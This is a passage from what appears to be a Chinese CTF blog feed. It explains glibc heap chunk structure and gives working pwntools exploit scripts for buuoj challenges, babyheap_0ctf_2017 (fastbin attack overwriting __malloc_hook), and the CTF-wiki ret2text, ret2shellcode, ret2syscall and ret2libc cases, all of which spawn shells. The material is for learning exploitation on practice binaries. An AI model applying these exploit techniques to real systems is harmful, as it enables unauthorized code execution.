class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">29130</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">format_str = <span class="number">0x080486F8</span></span><br><span class="line">printf_plt = elf.plt[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">main_addr = elf.symbols[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">printf_got = elf.got[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;read? &#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;-1&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;data!\n&#x27;</span>)</span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x30</span> + p32(printf_plt)+p32(main_addr)+p32(format_str)+p32(printf_got)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;said: &#x27;</span>)<span class="comment">#这是程序正常输出的</span></span><br><span class="line">p.recvuntil(<span class="string">&#x27;said: &#x27;</span>)<span class="comment">#这是printf的那个格式化字符串</span></span><br><span class="line">printf_addr = u32(p.recv(<span class="number">4</span>))</span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;printf&#x27;</span>, printf_addr)</span><br><span class="line">libc_base = printf_addr - libc.dump(<span class="string">&#x27;printf&#x27;</span>)</span><br><span class="line">sys_addr = libc_base + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">str_bin = libc_base + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;read? &#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;-1&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;data!\n&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;a&#x27;</span>*<span class="number">0x30</span> + p32(sys_addr) + p32(main_addr) + p32(str_bin))</span><br><span class="line">p.interactive()</span><br><span class="line"><span class="comment">#复制自https://blog.csdn.net/qinying001/article/details/104374305</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(os = <span class="string">&quot;linux&quot;</span>, arch = <span class="string">&quot;i386&quot;</span>, log_level= <span class="string">&quot;debug&quot;</span>)</span><br><span class="line">p = process(<span class="string">&#x27;./test1&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./test1&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;/lib/i386-linux-gnu/libc-2.23.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line">read_got = elf.got[<span class="string">&quot;read&quot;</span>]</span><br><span class="line">write_plt = elf.plt[<span class="string">&quot;write&quot;</span>]</span><br><span class="line">main_addr = elf.symbols[<span class="string">&quot;main&quot;</span>]</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;a&quot;</span> *(<span class="number">0xC8</span>+<span class="number">4</span>) + p32(write_plt)</span><br><span class="line">payload += p32(main_addr)</span><br><span class="line">payload += p32(<span class="number">1</span>) + p32(read_got) + p32(<span class="number">4</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Welcome!\n&#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line">read_addr = u32(p.recvuntil(<span class="string">&quot;\xf7&quot;</span>)[-<span class="number">4</span>:])</span><br><span class="line"><span class="comment"># libc = LibcSearcher(&quot;read&quot;, read_addr)</span></span><br><span class="line">libc_base = read_addr - libc.dump(<span class="string">&quot;read&quot;</span>)</span><br><span class="line">system_addr = libc_base + libc.dump(<span class="string">&quot;system&quot;</span>)</span><br><span class="line">binsh_addr = libc_base + libc.dump(<span class="string">&quot;str_bin_sh&quot;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;a&quot;</span> * (<span class="number">0xC8</span>+<span class="number">4</span>) + p32(system_addr)</span><br><span class="line">payload += p32(main_addr)</span><br><span class="line">payload += p32(binsh_addr)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Welcome!\n&#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>babyheap_0ctf_2017</title>
      <link href="/2021/11/15/%E5%A0%86%E6%BA%A2%E5%87%BA/"/>
      <url>/2021/11/15/%E5%A0%86%E6%BA%A2%E5%87%BA/</url>
      
        <content type="html"><![CDATA[<p>堆溢出</p><span id="more"></span><h2 id="malloc-chunk的结构"><a href="#malloc-chunk的结构" class="headerlink" title="malloc_chunk的结构"></a>malloc_chunk的结构</h2><p>参考文章：<a href="https://blog.csdn.net/weixin_43847969/article/details/104897249">https://blog.csdn.net/weixin_43847969/article/details/104897249</a></p><p><img src="https://img-blog.csdnimg.cn/20200316131506363.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80Mzg0Nzk2OQ==,size_16,color_FFFFFF,t_70"></p><p>pre_size:</p><p>这个参数分两种情况，一种情况记录大小，一种情况记录数据<br>当前一个chunk的状态是空闲时记录大小（也就是被free的时候），<br>当前一个chunk的状态不是空闲的时候，记录它的数据。<br>然后是</p><p>size：</p><p>就是这个chunk的大小,size的最后3个比特位对大小没有影响，但是要表示了一些东西<br>分别是non_main_arena :记录当前chunk是否属于主线程<br>is_mapped：当前chunk是否由mmap分配<br>prev_inuse：记录前一个chunk是否被分配（这个最重要，因为我们当这个参数为0时，我们能够通过它获得上一个chunk的大小和地址）</p><p>fd,bk:</p><p>表示用户数据，或者表示地址<br>chunk非空闲时，fd和bk存在的地方表示的是用户的数据，<br>chunk空闲时，fd存储下一个空闲的chunk，bk指向上一个空闲的chunk，这个非物理相邻表示的意思是，这个上一个和下一个表示的是被free的顺序，而不是地址上的相邻。</p><h2 id="chunk的结构"><a href="#chunk的结构" class="headerlink" title="chunk的结构"></a>chunk的结构</h2><p><img src="https://raw.githubusercontent.com/y1seco/blog_image/master/img/202111150944434.png" alt="在这里插入图片描述"></p><p>第一个是size of previous（前一个chunk的大小，如果前一个chunk空闲的话）<br>第二个size of chunk 当前chunk的大小，然后再末尾有3个比特位amp分别代表上面介绍过的3个参数<br>第三个就是存储数据的部分<br>然后就到了下一个chunk(next_chunk)，我们把这个next_chunk称为chunk2,上面的chunk称为chunk1，可以看到如果chunk1正在使用的话，那么chunk的头部位置，也就是prev_size，会被chunk1使用<br>然后chunk2的第二行的后三个比特位也分别是A01，A代表着是否属于主线程（这里我们不知道所以用A代替），0代表着当前chunk不是由mmap分配，1代表着前一个chunk已经被分配。</p><p>chunk被free后结构变化：</p><p><img src="https://img-blog.csdnimg.cn/20200316134429623.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80Mzg0Nzk2OQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>第一行,没变化，因为它是chunk1<br>第二行开始，M的位置变成了0，代表着chunk不是由mmap分配<br>第三行开始，原本存储数据的部分变成了forward pointer to next chunk in list<br>也就是fd，前面已经介绍过了，这个地方如果被使用的时候是数据，如果被free了，那么就存储的是下一个空闲的chunk，下面的back pointer to previous chunk in list（bk）同理.<br>然后就到了unused space，（maybe 0 bytes long），没有使用过的空间，这时候应该被收集到各种bin中去。<br>然后就到了chunk2,第一行记录当前chunk的大小，（并且不会被前一个chunk占用）<br>第二行记录前一个chunk的大小，并且末尾三位变成了A00,（这时候如果这个是堆中第一个被分配的chunk的话我们能通过prev_size字段获取上一个chunk的大小以及地址。）<br><img src="https://img-blog.csdnimg.cn/20200316135249139.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80Mzg0Nzk2OQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>chunk的空间复用：</p><p><img src="https://img-blog.csdnimg.cn/20200316133135882.png" alt="在这里插入图片描述"></p><h2 id="bin及分类"><a href="#bin及分类" class="headerlink" title="bin及分类"></a>bin及分类</h2><p><img src="https://img-blog.csdnimg.cn/20200316135544629.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80Mzg0Nzk2OQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h3 id="fast-bins"><a href="#fast-bins" class="headerlink" title="fast bins"></a>fast bins</h3><p><img src="https://raw.githubusercontent.com/y1seco/blog_image/master/img/202111150958166.png" alt="在这里插入图片描述"></p><h3 id="small-bins"><a href="#small-bins" class="headerlink" title="small bins"></a>small bins</h3><h3 id="large-bins"><a href="#large-bins" class="headerlink" title="large bins"></a>large bins</h3><h3 id="unsorted-bins"><a href="#unsorted-bins" class="headerlink" title="unsorted bins"></a>unsorted bins</h3><p>未被分类，刚被free未真的进入bin</p><p>Top Chunk</p><p><img src="https://img-blog.csdnimg.cn/20200316140527864.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80Mzg0Nzk2OQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h1 id="babyheap-0ctf-2017"><a href="#babyheap-0ctf-2017" class="headerlink" title="babyheap_0ctf_2017"></a>babyheap_0ctf_2017</h1><p>考点： fastbin attack</p><h2 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h2><p>两次 double free 与 fastbin attack 。<br>第一次先泄露 libc 地址，然后找到构造 fake chunk 的地址。<br>第二次通过构造的 fake chunk 堆溢出覆写 __malloc_hook 完成 get shell 。</p><h2 id="利用过程"><a href="#利用过程" class="headerlink" title="利用过程"></a>利用过程</h2><p>1、通过unsortedbin attack 来泄露libc地址</p><p>首先应该记住这样一条规律：当small chunk被释放时，它的fd、bk指向一个指针，这个指针指向top chunk地址，这个指针保存在main_arena的0x58偏移处，而main_arena是libc的data段中，是全局静态变量，所以偏移也是固定的，根据这些就可以计算出libc的基地址了，所以<em><strong>重点是当small chunk释放时，能读出fd 或者 bk的值</strong></em></p><p>我首先通过如下重叠两个块来泄漏libc的地址（也是常见的攻击）。<br><img src="https://img-blog.csdnimg.cn/20201002095257731.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21jbXV5YW5nYQ==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p>payload:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">e = ELF(<span class="string">&#x27;./libc-2.23.so&#x27;</span>)</span><br><span class="line">p = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">29370</span>)</span><br><span class="line"><span class="comment"># p = process(&#x27;./babyheap&#x27;)</span></span><br><span class="line">p.readuntil(<span class="string">&#x27;Command:&#x27;</span>)</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">alloc</span>(<span class="params">a</span>):</span></span><br><span class="line">    p.writeline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    p.readuntil(<span class="string">&#x27;Size:&#x27;</span>)</span><br><span class="line">    p.writeline(<span class="built_in">str</span>(a))</span><br><span class="line">    <span class="comment">#p.readuntil(&#x27;Command:&#x27;)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">update</span>(<span class="params">a,b,c</span>):</span></span><br><span class="line">    p.writeline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    p.readuntil(<span class="string">&#x27;Index:&#x27;</span>)</span><br><span class="line">    p.writeline(<span class="built_in">str</span>(a))</span><br><span class="line">    p.readuntil(<span class="string">&#x27;Size:&#x27;</span>)</span><br><span class="line">    p.writeline(<span class="built_in">str</span>(b))</span><br><span class="line">    p.readuntil(<span class="string">&#x27;Content:&#x27;</span>)</span><br><span class="line">    p.write(c)</span><br><span class="line">    p.readuntil(<span class="string">&#x27;Command:&#x27;</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dele</span>(<span class="params">a</span>):</span>  </span><br><span class="line">    p.writeline(<span class="string">&#x27;3&#x27;</span>)   </span><br><span class="line">    p.readuntil(<span class="string">&#x27;Index:&#x27;</span>)</span><br><span class="line">    p.writeline(<span class="built_in">str</span>(a))</span><br><span class="line">    p.readuntil(<span class="string">&#x27;Command:&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">a</span>):</span></span><br><span class="line">    p.writeline(<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">    p.readuntil(<span class="string">&#x27;Index:&#x27;</span>)</span><br><span class="line">    p.writeline(<span class="built_in">str</span>(a))</span><br><span class="line"></span><br><span class="line">alloc(<span class="number">0x18</span>) <span class="comment">#0</span></span><br><span class="line">alloc(<span class="number">0x18</span>) <span class="comment">#1</span></span><br><span class="line">alloc(<span class="number">0x68</span>) <span class="comment">#2</span></span><br><span class="line">alloc(<span class="number">0x68</span>) <span class="comment">#3</span></span><br><span class="line"></span><br><span class="line">update(<span class="number">0</span>, <span class="number">0x20</span>, <span class="string">&#x27;a&#x27;</span>*<span class="number">0x18</span>+p64(<span class="number">0x91</span>)) <span class="comment">#size1+size2</span></span><br><span class="line">dele(<span class="number">1</span>) <span class="comment">#1    #free1</span></span><br><span class="line">alloc(<span class="number">0x18</span>)   <span class="comment">#alloc1</span></span><br><span class="line">show(<span class="number">2</span>)     <span class="comment">#fd, bk at alloc2</span></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">libcbase = u64(p.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">&#x27;\x00&#x27;</span>)) - <span class="number">0x3c4b78</span></span><br><span class="line">log.info(<span class="built_in">hex</span>(libcbase))</span><br><span class="line">malloc_hook = libcbase + <span class="number">0x3c4aed</span></span><br><span class="line">log.info(<span class="built_in">hex</span>(malloc_hook))</span><br><span class="line">one = libcbase + <span class="number">0x4526a</span></span><br><span class="line"></span><br><span class="line">dele(<span class="number">2</span>)  <span class="comment">#free2</span></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">update(<span class="number">1</span>, <span class="number">0x28</span>, <span class="string">&#x27;a&#x27;</span>*<span class="number">0x18</span>+p64(<span class="number">0x71</span>)+p64(malloc_hook))   <span class="comment">#fd at 2-&gt;malloc_hook</span></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">alloc(<span class="number">0x68</span>)  <span class="comment">#2</span></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">alloc(<span class="number">0x68</span>)  <span class="comment">#4 at malloc_hook</span></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">update(<span class="number">4</span>, <span class="number">0x1b</span>, p8(<span class="number">2</span>)*<span class="number">3</span>+p64(<span class="number">2</span>)*<span class="number">2</span>+p64(one))</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">alloc(<span class="number">255</span>) </span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>CTF-WIKI-pwn-基本ROP 漏洞复现</title>
      <link href="/2021/11/11/ROP/"/>
      <url>/2021/11/11/ROP/</url>
      
        <content type="html"><![CDATA[<h1 id="基本ROP"><a href="#基本ROP" class="headerlink" title="基本ROP"></a>基本ROP</h1><span id="more"></span><h2 id="ret2text"><a href="#ret2text" class="headerlink" title="ret2text"></a>ret2text</h2><p>首先检查程序的保护机制。</p><p><img src="https://img-blog.csdnimg.cn/2019022710543258.png" alt="img"></p><p>关于各个保护机制的介绍 :<a href="https://www.cnblogs.com/Spider-spiders/p/8798628.html">https://www.cnblogs.com/Spider-spiders/p/8798628.html</a></p><p>看到只开启了NX保护，即不可在栈上执行代码。</p><p>使用IDA查看源码，可以看到这里有一个危险的gets函数</p><p><img src="https://img-blog.csdnimg.cn/20190227111810747.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM4MDI1MzY1,size_16,color_FFFFFF,t_70" alt="img"></p><p>以及这里有一个system函数</p><p><img src="https://img-blog.csdnimg.cn/20190227111904256.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM4MDI1MzY1,size_16,color_FFFFFF,t_70" alt="img"></p><p> <img src="https://img-blog.csdnimg.cn/20190227111935558.png" alt="img"></p><p>所以如果能直接返回到0x804863A，即可执行该函数。</p><p>在GDB中对main函数里的gets函数下断点。</p><p><img src="https://img-blog.csdnimg.cn/20190227112321284.png" alt="img"></p><p><img src="https://img-blog.csdnimg.cn/20190227112412951.png" alt="img"></p><p>可以看到，存储局部变量 s(eax) 位于esp中存储</p><p>查看esp和ebp得知</p><p><img src="https://img-blog.csdnimg.cn/201902271125369.png" alt="img"></p><p>s的地址为0xffffcecc</p><p>ebp地址为0xffffcf38</p><p><img src="https://img-blog.csdnimg.cn/20190227112810664.png" alt="img"></p><p>两者距离108个字节</p><p>所以108+4=112即为返回地址的地址。( 因为没有开启canary，ebp上就是返回地址的值了。)</p><p><img src="https://img-blog.csdnimg.cn/20190227113810258.png" alt="img"></p><p>python脚本，我会给出注释</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> * </span><br><span class="line">sh = process(<span class="string">&#x27;./ret2text&#x27;</span>) <span class="comment">#本地链接到文件</span></span><br><span class="line">target = <span class="number">0x804863a</span> <span class="comment">#执行system(&#x27;/bin/sh&#x27;)函数的地址</span></span><br><span class="line">sh.sendline(<span class="string">&#x27;A&#x27;</span> * <span class="number">112</span> + p32(target)) <span class="comment"># 112是上面计算出来的s距离返回地址的字节距离</span></span><br><span class="line">sh.interactive() <span class="comment">#进行交互</span></span><br></pre></td></tr></table></figure><h2 id="ret2shellcode"><a href="#ret2shellcode" class="headerlink" title="ret2shellcode"></a>ret2shellcode</h2><p>先检查程序的保护机制</p><p><img src="https://img-blog.csdnimg.cn/20190227164142987.png" alt="img"></p><p>全部关闭，并且通过RELRO 为Partial 部分模式，得知程序存在存在可读可写可执行段。</p><p><img src="https://img-blog.csdnimg.cn/20190227164305727.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM4MDI1MzY1,size_16,color_FFFFFF,t_70" alt="img"></p><p>通过IDA观察得知，这次同样使用不安全的gets输入，并且将输入完的值拷贝至buf2，观察buf2是什么样的一块内存。</p><p><img src="https://img-blog.csdnimg.cn/20190227164359894.png" alt="img"></p><p>buf是一块位于bss段的可读可写可执行段。所以泄露思路为:</p><p>将shellcode拷贝至buf2里，然后通过堆栈溢出将函数返回到执行buf2即可。</p><p>在gets函数处下断点</p><p><img src="https://img-blog.csdnimg.cn/20190227165108812.png" alt="img"></p><p><img src="https://img-blog.csdnimg.cn/20190227165123143.png" alt="img"></p><p>得知s地址为0xffffcecc，ebp地址为0xffffcf38</p><p>ebp+4即为函数返回地址。</p><p>所以0xcf38-0xcecc+4即为s与返回地址之间的字节距离。</p><p>写python脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.binary = <span class="string">&#x27;ret2shellcode&#x27;</span> <span class="comment">#全局自动设置架构类型与os类型</span></span><br><span class="line">sh=process(<span class="string">&#x27;./ret2shellcode&#x27;</span>) <span class="comment">#本地连接</span></span><br><span class="line">target=<span class="number">0x804A080</span><span class="comment">#buf2的地址</span></span><br><span class="line">shellcode=asm(shellcraft.sh())<span class="comment">#产生以一个最简单的执行system(&#x27;/bin/sh&#x27;)的shellcode 并进行汇编</span></span><br><span class="line"><span class="built_in">print</span>(p32(target))</span><br><span class="line">payload=shellcode.ljust(<span class="number">0xcf38</span>-<span class="number">0xcecc</span>+<span class="number">4</span>,<span class="string">&#x27;A&#x27;</span>)+p32(target)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><h2 id="ret2syscall"><a href="#ret2syscall" class="headerlink" title="ret2syscall"></a>ret2syscall</h2><p>先检查开启了哪些防护措施</p><p><img src="https://img-blog.csdnimg.cn/20190227225033419.png" alt="img"></p><p>开启了NX保护，所以无法在栈上直接执行代码。</p><p>使用IDA查看，仍然是gets函数导致的栈溢出。</p><p>使用系统调用来完成漏洞利用。</p><p><img src="https://img-blog.csdnimg.cn/20190227225149853.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM4MDI1MzY1,size_16,color_FFFFFF,t_70" alt="img"></p><p><img src="https://img-blog.csdnimg.cn/20190227225240795.png" alt="img"></p><p>找到pop eax,ret，以同样的方法找到ebx.ecx.edx 以及int 80h系统调用和bin/sh</p><p><img src="https://img-blog.csdnimg.cn/20190227225941829.png" alt="img"></p><p><img src="https://img-blog.csdnimg.cn/20190227230001980.png" alt="img"></p><p><img src="https://img-blog.csdnimg.cn/20190227230010832.png" alt="img"></p><p>接下来要了解payload这样构成的原因，需要知道这三个指令</p><p><img src="https://img-blog.csdnimg.cn/20190227230150786.png" alt="img"></p><p>在堆栈里，我们知道ebp+4的地方为返回地址。这是因为leave 时 esp=ebp+4,ret 将当前esp指向的值作为返回地址跳转并且ESP+4。</p><p>所以构造payload为 payload = flat([‘A’ * 112, pop_eax_ret, 0xb, pop_edx_ecx_ebx_ret, 0, 0, binsh, int_0x80])</p><p>先用112个A填充，pop_eax_ret为第一个返回地址，然后ESP指向0xb,以此类推。</p><p>写出python脚本，之前都解释过 不再注释了。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">&#x27;./rop&#x27;</span>)</span><br><span class="line">context.binary= <span class="string">&#x27;rop&#x27;</span></span><br><span class="line"></span><br><span class="line">binsh = <span class="number">0x80be409</span></span><br><span class="line">int_0x80 = <span class="number">0x8049421</span></span><br><span class="line">pop_eax_ret = <span class="number">0x080bb196</span></span><br><span class="line">pop_edx_ecx_ebx_ret = <span class="number">0x0806eb90</span></span><br><span class="line"></span><br><span class="line">payload = flat([<span class="string">&#x27;A&#x27;</span> * <span class="number">112</span>, pop_eax_ret, <span class="number">0xb</span>, pop_edx_ecx_ebx_ret, <span class="number">0</span>, <span class="number">0</span>, binsh, int_0x80])</span><br><span class="line">sh.sendline(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><h2 id="ret2libc1"><a href="#ret2libc1" class="headerlink" title="ret2libc1"></a>ret2libc1</h2><p>给出got表 PLT表 以及libc的相关解释，我觉得写的很清楚</p><p><a href="https://blog.csdn.net/Retrovich/article/details/82973086">https://blog.csdn.net/Retrovich/article/details/82973086</a></p><p>基本流程仍然相似，先检查保护</p><p><img src="https://img-blog.csdnimg.cn/20190228112803224.png" alt="img"></p><p>只打开了NX</p><p>检查是否存在/bin/sh</p><p><img src="https://img-blog.csdnimg.cn/20190228122346772.png" alt="img"></p><p>在IDA中查找system函数</p><p><img src="https://img-blog.csdnimg.cn/20190228113556749.png" alt="img"></p><p>查看到ptl处的system函数</p><p>写Python脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.binary = <span class="string">&#x27;ret2libc1&#x27;</span></span><br><span class="line">sh = process(<span class="string">&#x27;./ret2libc1&#x27;</span>)</span><br><span class="line">binsh = <span class="number">0x8049720</span></span><br><span class="line">system = <span class="number">0x8048460</span></span><br><span class="line">payload = flat([<span class="string">&#x27;A&#x27;</span>*<span class="number">112</span>+system+<span class="string">&#x27;b&#x27;</span>*<span class="number">4</span>+binsh])<span class="string">&quot;&quot;&quot;这里我们需要注意函数调用栈的结构，如果是正常调用 system 函数，我们调用的时候会有一个对应的返回地址，这里以&#x27;bbbb&#x27; 作为虚假的地址，其后参数对应的参数内容。&quot;&quot;&quot;</span></span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><h2 id="ret2libc2"><a href="#ret2libc2" class="headerlink" title="ret2libc2"></a>ret2libc2</h2><p>这里仍然用相同的流程，唯一不同的是没有直接给出/bin/sh,需要先调用gets函数再利用pop ret调用system函数</p><p><img 